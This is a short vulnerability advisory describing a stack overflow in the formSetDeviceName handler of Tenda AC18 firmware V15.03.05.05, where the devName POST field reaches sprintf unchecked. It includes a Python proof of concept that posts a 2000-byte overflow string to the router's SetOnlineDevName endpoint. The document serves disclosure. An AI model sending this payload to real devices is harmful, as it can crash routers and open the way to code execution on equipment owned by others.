## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formSetDeviceName` function. The `v7` variable receives the `devName` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `devName` can trigger this security vulnerability.

![image-20240306170433342](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306170433342.png)

![image-20240306170444112](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306170444112.png)

![image-20240306170453887](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306170453887.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*2000

data = {"mac": 1,"devName": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240306171156310](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306171156310.png)
